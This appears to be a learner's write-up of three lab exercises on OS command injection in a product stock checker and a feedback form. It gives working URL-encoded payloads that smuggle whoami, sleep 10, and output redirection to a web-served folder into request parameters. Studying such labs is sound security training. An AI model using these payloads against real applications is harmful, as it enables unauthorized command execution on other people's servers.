# OS Command Injection

## :material-gauge-empty: OS command injection, simple case

!!! question
    This lab contains an OS command injection vulnerability in the product stock checker.

    The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

    To solve the lab, execute the `whoami` command to determine the name of the current user.

This application issues a `POST` reequest to the `/product/stock` endpoint with the following expected payload: `productId=1&storeId=1`. With valid values, you receive something like `62` as the payload of the response.

The instructions and page make it appear as though you simply change the values to `echo test` or something like `productId=& whoami &storeId=1` but it wasn't quite that simle for me. Instead, I had to play around a bit with URL encoding, and ended up with the following:

```text
productId=%26%20echo%20george%20%26&storeId=whoami
```

Which gave me a return like this:

```text
george
peter-tVfyfI
```

I'm *certain* there are other variations that will produce the right results. 

## :material-gauge: Blind OS command injection with time delays

!!! question
    This lab contains a blind OS command injection vulnerability in the feedback function.

    The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

    To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

I modified the request as follows (`& sleep 10 &`):

```text
csrf=VWek8OQ95kgxwPflHuYs4ECgWNDFwhYx&name=%26%20sleep%2010%20%26&email=%26%20sleep%2010%20%26&subject=%26%20sleep%2010%20%26&message=%26%20sleep%2010%20%26
```

This worked, but it bugs be a little that I had to replace all of the params with the injected command. I did some additional testing, and it looks like (for some unknown reason) *both* the `email` and `subject` params need to have the sleep command, otherwise it simply returns immediately.


## :material-gauge: Blind OS command injection with output redirection

!!! question
    This lab contains a blind OS command injection vulnerability in the feedback function.

    The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

    `/var/www/images/`

    The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

    To solve the lab, execute the `whoami` command and retrieve the output.

To solve this challenge, I crafted a string: `& whoami > /var/www/images/bubba &` and then fully URL-encoded it as `%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26`. 

Using the information from the prior challenge, I substituted my command payload in both the `email` and `subject` fields as such:

```text
csrf=S8sIaTUHU6dSoL5PmQ8UhXVy4ud17qLa&name=george&email=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&subject=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&message=test
```

And submitted it. I then found an image-returning request and modified the path to my newly-created file: `GET /image?filename=bubba HTTP/1.1` and I was presented with the currently running user: `peter-rYqzDj`


